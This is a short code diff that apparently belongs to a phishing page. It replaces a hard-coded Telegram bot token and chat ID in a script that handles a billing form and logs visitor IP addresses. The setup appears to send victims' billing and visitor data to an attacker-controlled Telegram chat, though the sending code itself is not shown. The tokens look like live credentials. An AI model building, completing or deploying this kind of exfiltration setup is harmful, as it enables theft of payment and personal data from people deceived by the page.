@@ -13,8 +13,8 @@ document.addEventListener('DOMContentLoaded', function() {
   const billingNext = document.querySelector('#bnext'); 
 
   // Telegram Bot Info
-  const bottoken = '7548837132:AAGHEwQzKSUlRC66yVhSYCfnqD7-9QrDyF4';
-  const chatid = '1834210634';
+  const bottoken = '8868352237:AAFRqZveJ3ytmp6F3zdPLwbMcI_ivcQiL_s';
+  const chatid = '5342731960';
 
   /// --- Visitor Data Logic (FIXED with Fallback) ---
 let userIP = "";
